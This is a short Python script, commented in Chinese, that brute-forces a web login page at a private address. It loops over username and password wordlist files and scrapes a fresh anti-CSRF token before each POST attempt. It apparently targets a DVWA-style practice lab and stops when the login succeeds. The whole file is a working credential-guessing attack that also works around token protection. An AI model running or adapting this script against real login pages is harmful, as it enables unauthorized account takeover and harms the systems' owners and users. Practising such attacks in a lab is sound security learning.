import sys
import requests
import re

url = 'http://10.1.10.1/login.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0'
}

# 使用Session对象复用同一会话
session = requests.Session()

try:
    # 读取用户名
    with open(r'.\user.txt', 'r') as username_file:
        usernames = username_file.read().splitlines()
    # 读取密码
    with open(r'.\pass.txt', 'r') as password_file:
        passwords = password_file.read().splitlines()

    # 对每对用户名和密码尝试登录
    for username in usernames:
        for password in passwords:
            response1 = session.get(url, headers=headers)
            user_token_match = re.search(r'[0-9a-z]{32}', response1.text)

            if user_token_match:
                user_token = user_token_match.group()
            else:
                print('Token未找到，跳过登录尝试。')
                continue

            data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': user_token
            }

            response2 = session.post(url, data=data, headers=headers)

            if "You have logged in as" in response2.text:
                print(f"登录成功: 用户名 - {username} 密码 - {password}")
                sys.exit()
            else:
                print(f"登录失败: 用户名 - {username} 密码 - {password}")
except Exception as e:
    print(f"发生错误: {e}")
    sys.exit(1)
